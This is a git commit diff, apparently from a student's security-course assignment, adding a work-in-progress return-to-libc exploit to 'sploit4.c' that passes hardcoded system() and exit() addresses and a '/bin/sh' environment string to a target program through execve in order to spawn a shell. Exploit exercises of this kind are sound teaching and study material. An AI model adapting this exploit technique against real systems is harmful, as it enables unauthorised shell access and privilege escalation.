74e3c98342c506fb281b65c5fa059e56c389aea0
Yordanos <yag3@cornell.edu>
2019-12-03 17:37:45 -0500

    sploit4 wip

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -12,11 +12,26 @@ int main(void)
   char *args[3]; 
   char *env[1];
   
+
   args[0] = TARGET;
-  args[1] = "student"; 
+  
+
+  //change the address to the env
+  printf("AA\n");
+  char rt_arr[16] = "";
+  strcat(rt_arr, "\xa0\x3d\xe4\xb7");
+
+  //p system 0xb7 e4 3d a0 
+  strcat(rt_arr, "\xa0\x3d\xe4\xb7");
+  //p exit 0xb7 e3 79 d0
+  strcat(rt_arr, "\xd0\x79\xe3\xb7");
+  //argument add - 0xbf ff f7 b1 
+  strcat(rt_arr, "\xb1\xf7\xff\xbf");
+   
+  args[1] = rt_arr; 
   args[2] = NULL;
   
-  env[0] = NULL;
+  env[0] = "/bin/sh";
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
